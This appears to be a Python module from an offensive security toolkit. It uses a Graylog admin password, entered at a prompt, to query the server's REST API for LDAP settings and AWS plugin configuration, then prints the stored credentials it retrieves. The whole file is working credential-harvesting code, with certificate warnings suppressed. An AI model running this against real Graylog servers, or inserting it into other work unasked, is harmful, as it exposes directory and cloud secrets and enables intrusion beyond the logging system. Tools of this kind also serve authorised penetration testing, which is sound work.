#!/usr/bin/env python3

# Graylog Obtain Stored Credentials via REST API

# %%%%%%%%%%% Libraries %%%%%%%%%%%#


import getpass
import logging
import urllib3
import globals
import colorama
import requests

from colorama import Fore
from colorama import Style
from requests.auth import HTTPBasicAuth

colorama.init()
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# %%%%%%%%%% Functions %%%%%%%%%#


def obtain_ldap_credentials(ip, port):

	ldapurl = globals.http + ip + ":" + str(
		port) + "/api/system/ldap/settings?pretty=true"
	awspluginurl = globals.http + ip + ":" + str(
		port) + "/api/system/cluster_config/org.graylog.aws.config.AWSPluginConfiguration?pretty=true"
	headers = {'Accept': 'application/json'}
	graylogpass = getpass.getpass(
		Fore.CYAN + Style.BRIGHT + "[!] Enter Graylog Admin Password: " +
		Style.RESET_ALL)

	try:
		response = requests.get(ldapurl, auth=HTTPBasicAuth('admin', graylogpass))

		if response.status_code == 200 and "DOCTYPE html" not in response.text:
			globals.graylog_messages(1)
			print(response.text.strip('{}').replace('\n', '\n[!]'))
		else:
			globals.graylog_messages(2)

	except Exception as e:
		logging.error(e, exc_info=True)

	try:
		response = requests.get(
			awspluginurl, auth=HTTPBasicAuth(
				'admin', graylogpass), headers=headers)

		if response.status_code == 200 and "DOCTYPE html" not in response.text:
			globals.graylog_messages(3)
			print(response.text.strip('{}').replace('\n', '\n[!]'))
		else:
			globals.graylog_messages(4)

	except Exception as e:
		logging.error(e, exc_info=True)

# %%%%%%%%%% The End %%%%%%%%%%#
